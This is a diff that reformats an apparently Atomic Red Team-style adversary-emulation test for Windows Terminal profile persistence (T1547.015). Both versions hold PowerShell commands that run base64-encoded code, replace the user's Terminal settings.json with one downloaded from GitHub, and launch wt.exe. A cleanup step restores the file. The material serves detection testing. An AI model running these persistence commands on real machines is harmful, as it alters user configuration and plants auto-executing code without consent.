@@ -1,21 +1,16 @@
-- id: fad12e78-16de-5175-b97c-ab06d20f7f0e
+- requirements: []
   name: Soumaia ART Tests - Persistence by modifying Windows Terminal profile
   description: Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)
   tactic: ''
-  technique:
-    attack_id: T1547.015
-    name: 'Boot or Logon Autostart Execution: Login Items'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAH4AXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAEEAcABwAHMAXABNAGkAYwByAG8AcwBvAGYAdAAuAFcAaQBuAGQAbwB3AHMAVABlAHIAbQBpAG4AYQBsAF8AOAB3AGUAawB5AGIAMwBkADgAYgBiAHcAZQBcAHcAdAAuAGUAeABlACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand JAAoAHIAbQAgAH4AXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAUABhAGMAawBhAGcAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQALgBEAGUAcwBrAHQAbwBwAEEAcABwAEkAbgBzAHQAYQBsAGwAZQByAF8AOAB3AGUAawB5AGIAMwBkADgAYgBiAHcAZQBcAEwAbwBjAGEAbABTAHQAYQB0AGUAXABTAHQAbwByAGUARQBkAGcAZQBGAEQAXABpAG4AcwB0AGEAbABsAGUAZAAuAGQAYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAOwAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgAiADsAIAAkAD8AKQAgAC0AYQBuAGQAIAAkACgAdwBpAG4AZwBlAHQAIABpAG4AcwB0AGEAbABsACAALQAtAGkAZAA9AE0AaQBjAHIAbwBzAG8AZgB0AC4AVwBpAG4AZABvAHcAcwBUAGUAcgBtAGkAbgBhAGwAKQAKAA==
-          }
-          mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
-          wt.exe
-        cleanup: |-
-          mv -Force ~\AppData\Local\Temp\settings.json ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
-          taskkill /F /IM "calculator.exe" > $null
+  technique_id: T1547.015
+  technique_name: 'Boot or Logon Autostart Execution: Login Items'
+  executors:
+  - cleanup:
+    - mv -Force ~\AppData\Local\Temp\settings.json ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json; taskkill /F /IM "calculator.exe" > $null
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAH4AXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAEEAcABwAHMAXABNAGkAYwByAG8AcwBvAGYAdAAuAFcAaQBuAGQAbwB3AHMAVABlAHIAbQBpAG4AYQBsAF8AOAB3AGUAawB5AGIAMwBkADgAYgBiAHcAZQBcAHcAdAAuAGUAeABlACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand JAAoAHIAbQAgAH4AXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAUABhAGMAawBhAGcAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQALgBEAGUAcwBrAHQAbwBwAEEAcABwAEkAbgBzAHQAYQBsAGwAZQByAF8AOAB3AGUAawB5AGIAMwBkADgAYgBiAHcAZQBcAEwAbwBjAGEAbABTAHQAYQB0AGUAXABTAHQAbwByAGUARQBkAGcAZQBGAEQAXABpAG4AcwB0AGEAbABsAGUAZAAuAGQAYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAASQBnAG4AbwByAGUAOwAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgAiADsAIAAkAD8AKQAgAC0AYQBuAGQAIAAkACgAdwBpAG4AZwBlAHQAIABpAG4AcwB0AGEAbABsACAALQAtAGkAZAA9AE0AaQBjAHIAbwBzAG8AZgB0AC4AVwBpAG4AZABvAHcAcwBUAGUAcgBtAGkAbgBhAGwAKQAKAA== }; mv ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json ~\AppData\Local\Temp\settings.json; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"; wt.exe
+  id: fad12e78-16de-5175-b97c-ab06d20f7f0e
